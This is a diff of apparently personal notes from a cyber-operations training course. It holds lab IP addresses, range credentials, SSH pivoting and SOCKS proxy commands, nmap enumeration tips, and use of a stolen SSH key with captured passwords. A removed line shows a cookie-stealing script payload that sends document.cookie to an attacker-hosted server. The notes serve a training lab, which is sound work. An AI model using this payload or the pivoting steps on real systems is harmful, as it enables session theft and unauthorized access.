@@ -1,11 +1,12 @@
 
 Day 0 Setup: https://cctc.cybbh.io/students/students/latest/Day_0_Setup.html
+Opstations: https://vta.cybbh.space/auth/login/?next=/
 Stack: Mitton_Ops_Stations
 Pass: standard workstation pass
-Opstations: 10.50.23.139 (Linux), 10.50.26.168 (Windows)
+Opstations: 10.50.26.214 (Linux), 10.50.36.1 (Windows)
         - Creds: student / password
-ssh student@10.50.23.139 -X
-OR xfreerdp /v:10.50.26.168 /u:student /p:password /size:1920x1000 +clipboard
+ssh student@10.50.26.214 -X
+OR xfreerdp /v:10.50.36.1 /u:student /p:password /size:1920x1000 +clipboard
 
 CTFD Server: 10.50.20.103:8000
 Username: LUMI-007-M
@@ -25,8 +26,16 @@ Opstation: vta.cybbh.space
 
 
 
+192.168.28.100 = Donovian_Extranet (dead end)
+SSH key passphrase: howdy (www-data)
 
-getTheGoods = x86.get_pc_thunk.bx, printf@plt, fgets@plt, puts@plt, usleep@plt
+39658 > 3201
+
+192.168.150.253 = Donovian_Intranet
+ssh -i stolenkey comrade@localhost -p 4202
+comrade::StudentMidwayPassword
+
+192.168.28.9 = 
 
 
 
@@ -50,16 +59,15 @@ OPS: firefox #opens Firefox through X11, type in http://127.0.0.1:1111 / http://
 SOCKET 2
 OPS: ssh -MS /tmp/t1 creds@127.0.0.1 -p 2222 #ssh again, creating a new master socket this time with acquired credentials to the the desired 192.168.28.100 box with an alt SSH port on 2222
         #this will let you easily get further beyond the .100 box
-OPS: ssh -S /tmp/jump jump -O cancel -D 9050 #cancel the jump proxy
+OPS: ssh -S /tmp/jump jump -O cancel -D 9050 #cancel the jump proxy@
 OPS: ssh -S /tmp/t1 t1 -O forward -D 9050 #start the t1 proxy
+
+To map sysinternals to your system: net use Z: "\\http://live.sysinternals.com" /persistent:yes
 
 
 Nmap scripts: located in /usr/share/nmap/scripts/
 good nmap script for http enumeration: nmap --script=http-enum.nse [IP]
 
-
-python3 -m http.server
-<script>document.location="http://10.50.33.134:8000/"+document.cookie;</script>
 
 
 
